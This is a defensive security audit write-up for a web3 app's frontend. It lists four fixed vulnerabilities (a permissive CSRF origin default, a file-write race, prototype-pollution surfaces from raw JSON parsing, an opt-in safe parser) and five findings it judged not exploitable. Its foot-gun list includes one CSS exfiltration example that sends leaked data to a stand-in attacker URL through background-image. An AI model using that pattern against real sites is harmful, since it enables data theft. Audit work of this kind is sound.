# Web2 Security Audit — Adversarial Pass

Status: 🟢 ALL REAL FINDINGS FIXED — survey + fixes 2026-04-26.
Scope: same surface as the normal pass + the defenses shipped from it (CSP nonce, safeJson, window.ethereum guard, AgreementPreviewModal, agreement-registry size cap, COOP/CORP, Origin allowlist).
Methodology: hostile frame — try to find what the normal pass missed by chaining low-severity findings, surfacing race conditions, looking for foot-guns in the new defenses.

---

## 1. Frame

The auditor was instructed to attack the defenses we just shipped, not re-cover the checklist. The findings are useful but mixed: three real exploitable gaps + several "looks scary, isn't" that need to be filed under negative results so we don't waste time chasing them again.

Honest audit hygiene means recording the false positives explicitly. If we don't, the next audit pass will rediscover the same overstated risks and either re-flag them as real or quietly drop them — both lose information.

---

## 2. Real exploitable findings

### 2.1 🔴 `FIGARO_ALLOWED_ORIGINS` defaults to permissive

**File:** `app/api/semantic/agreements/route.ts:40-49`

The Origin allowlist I just shipped (Web2 normal-pass Priority 3) defaults to "any origin allowed" when the env var is unset. Comment says "local-dev convenience" but the real risk is a production deployment that forgets to set the var — the POST endpoint becomes wide open to CSRF, with only the JSON-only Content-Type check + browser CORS preflight as defenses.

**Exploit-readiness:** HIGH. It only takes one production deploy that doesn't set the env to expose this. The misconfig is invisible (no startup warning, no failing test).

**Fix:** Detect production via `NODE_ENV === "production"`. In production, an unset allowlist rejects all. In dev/test, keep permissive default. Standard Next.js env-detection pattern.

### 2.2 🔴 Agreement-registry file-write race condition

**File:** `lib/core/agreementPublicationRegistry.server.ts:upsertAgreementPublication`

The upsert path is `readRegistry → JSON.parse → mutate → JSON.stringify → size check → writeRegistryRaw`. None of this is atomic. Two concurrent POSTs can both pass the size check, then one's write overwrites the other's. The 10 MB cap I added catches the wrong issue — it bounds total size, not concurrent corruption.

**Exploit-readiness:** MEDIUM. Requires concurrent POSTs in flight at the same event-loop tick. Realistic under load; trivial under a deliberate burst. Outcome is silent data loss — a publisher's URI could be silently overwritten by an attacker's concurrent request to the same hash, or two unrelated publishers could clobber each other.

**Fix:** Module-scope async mutex serializing the read-modify-write. Simpler than file-locking via `proper-lockfile`; sufficient for the single-process Node server in dev. Production deployment would want a real database, but that's the same recommendation as the normal-pass audit (registry isn't intended for production).

### 2.3 🟡 Three unwrapped `.json()` calls

**Files:**
- `lib/shared/schemaSpecSource.ts:67` — fetches schema specs from IPFS or local URI; result feeds `parseSchemaSpec`. Spec validator does shape-check, but prototype-pollution-via-`__proto__` slips past shape validation.
- `lib/shared/runtimeFetchSource.ts:56` — fetches runtime identity documents; result feeds `parseRuntimeIdentityDocument`.
- `lib/shared/runtimeResolution.ts` — fetches assembly runtime asset documents; previously deferred (Priority 3 normal-pass) because the `RuntimeAssetDocumentResponseLike` fetcher abstraction exposes only `.json()`. Should expand the interface to include `.text()` and wrap.

**Exploit-readiness:** LOW. Requires attacker control over an IPFS CID or compromise of the runtime identity endpoint. Downstream validators bound the blast radius (parsed objects pass through schema-shape checks before being consumed via property access). But the prototype-pollution surface itself is open at the parse boundary, and the principle of consistent defense should apply.

**Fix:** Wrap all three with `safeJsonFromResponse` or `safeJsonParse` after extending the duck-typed interface where needed.

### 2.4 🟡 `safeJson` is opt-in (foot-gun for future contributors)

A new contributor calling `await res.json()` directly anywhere reintroduces the prototype-pollution surface. There's no enforcement.

**Fix:** Add an eslint rule (or pre-commit grep) flagging direct `.json()` calls outside the `safeJson.ts` module. Allow an explicit override comment for the rare cases that need it.

---

## 3. Audited but not exploitable (negative results)

### 3.1 SVG XSS via `<img src>` from IPFS

**Auditor's claim:** "Malicious SVG uploaded to IPFS executes JavaScript in the page context when rendered as `<img src>`."

**Reality:** Modern browsers explicitly block script execution in SVG-as-`<img>` per the SVG spec. Scripts inside SVGs only execute when loaded via `<object>`, `<iframe>`, or inline `<svg>`. The codebase uses `<img src>` exclusively for IPFS-resolved content; `<object>` and inline SVG are not used; no `dangerouslySetInnerHTML` accepts SVG markup.

**Verdict:** 🟢 OK under current rendering pattern. Worth recording as a foot-gun for future contributors: if anyone adds `<object data={ipfsUrl}>` or inline `<svg>` rendering of user-controlled content, this re-opens.

### 3.2 AgreementPreviewModal concurrent-sign race

**Auditor's claim:** "If Tab A and Tab B call `signCommitment` in rapid succession, both calls proceed and the second user signs without seeing the modal."

**Reality:** Module-scope singleton store has separate state per-tab (each tab has its own JS context; `current` is tab-local). Within a single tab, the second `requestSignConfirmation` returns `Promise.resolve(false)`, which causes `signCommitment` to throw "Signing cancelled by user" — no wallet prompt opens, no signature happens. The user sees an error, not a silent sign.

**Verdict:** 🟢 OK. The "race" exists but is correctly handled — the second call rejects, doesn't slip through. UX is suboptimal (confusing error message for a click that never showed a modal) but not a security hole.

### 3.3 CSP `'strict-dynamic'` script chain

**Auditor's claim:** "Once a nonce-bearing script loads, any spawned script inherits trust. wagmi/RainbowKit could construct script-like sinks at runtime."

**Reality:** `'strict-dynamic'` is the standard CSP pattern for SPAs that bundle their JS via webpack — it's the only practical alternative to per-asset SRI with build-time hash injection. wagmi and RainbowKit don't use `eval` or dynamic `import(userControlledString)`. Supply-chain risk applies to any npm dependency regardless of CSP design.

**Verdict:** 🟢 OK as a CSP design choice. Supply-chain risk is real but orthogonal — pin lockfile, run `npm audit` in CI.

### 3.4 `window.ethereum` guard on `NODE_ENV` mismatch

**Auditor's claim:** "Build-time NODE_ENV could differ from runtime NODE_ENV in some Edge deployments."

**Reality:** Next.js inlines `process.env.NODE_ENV` at build time, so the runtime value matches the build value by construction. The guard is also defense-in-depth (it's not the primary defense — the primary is that production sign flows route through wagmi, never direct `window.ethereum`). No exploit found.

**Verdict:** 🟢 OK.

### 3.5 CORP `same-origin` blocking Kleros iframe content

**Auditor's claim:** "Kleros jurors viewing dispute evidence can't load images embedded from the IPFS gateway because CORP blocks cross-origin embeds."

**Reality:** CORP applies to resources served from THIS app, not to the IPFS gateway (which is a separate origin and serves its own headers). Kleros embedding the `/evidence-display` page into an iframe is allowed by `frame-ancestors`; the iframe loads images from the IPFS gateway directly (cross-origin to both the app AND Kleros), which is governed by the gateway's CORS / CORP headers, not ours. Our `CORP: same-origin` only prevents OTHER sites from hotlinking OUR static assets — which is what we want.

**Verdict:** 🟢 OK as configured.

---

## 4. Summary verdict

| Finding | Severity | Status |
|---|---|---|
| FIGARO_ALLOWED_ORIGINS permissive default | 🔴 | ✅ Fixed 2026-04-26 |
| Agreement-registry file-write race | 🔴 | ✅ Fixed 2026-04-26 |
| Three unwrapped `.json()` calls | 🟡 | ✅ Fixed 2026-04-26 |
| `safeJson` opt-in foot-gun | 🟡 | ✅ Fixed 2026-04-26 (lint rule) |
| SVG XSS via `<img src>` | 🟢 | Not exploitable (browser SVG-as-img sandboxing) |
| AgreementPreviewModal concurrent-sign | 🟢 | Not exploitable (second call rejects, doesn't slip through) |
| CSP `'strict-dynamic'` script chain | 🟢 | Not a design issue (standard SPA pattern) |
| `window.ethereum` NODE_ENV mismatch | 🟢 | Build-time inline; defense-in-depth |
| CORP blocking Kleros embeds | 🟢 | Cross-origin gateway is on its own headers |

---

## 5. Foot-guns to watch for

Recorded for future contributors so they don't reopen what we just closed:

- **Don't use `<object data={ipfsUrl}>` or inline `<svg>` with user-controlled content.** SVG-as-img is sandboxed; the others aren't.
- **Don't bypass `useCommitmentFlow.signCommitment`.** Direct calls to wagmi's `signTypedDataAsync` skip the AgreementPreviewModal pre-sign gate. If you find yourself wanting to sign typed data, route through the existing hook.
- **Don't add CSS-injection sinks.** `style-src 'unsafe-inline'` is kept for Tailwind compatibility; if a future component does `style={{...userControlledObject}}` with attacker-influenceable values, CSS-based exfiltration (e.g., `background-image: url('https://attacker?leak=...')`) becomes possible.
- **Don't call `await res.json()` directly.** Use `safeJsonFromResponse` (lint rule enforces). The exception is internal trusted endpoints we control end-to-end (mark with `// eslint-disable-next-line no-raw-response-json -- <reason>`).

---

## 6. Provenance

- Adversarial survey 2026-04-26 by an Explore subagent against `frontend2/` at SHA `1ed741f`.
- Findings filtered for exploitability before write-up — recorded both real findings and the false-positive analysis explicitly so the next audit pass starts from honest priors.
- Fixes landed same day; no code changes at survey time.
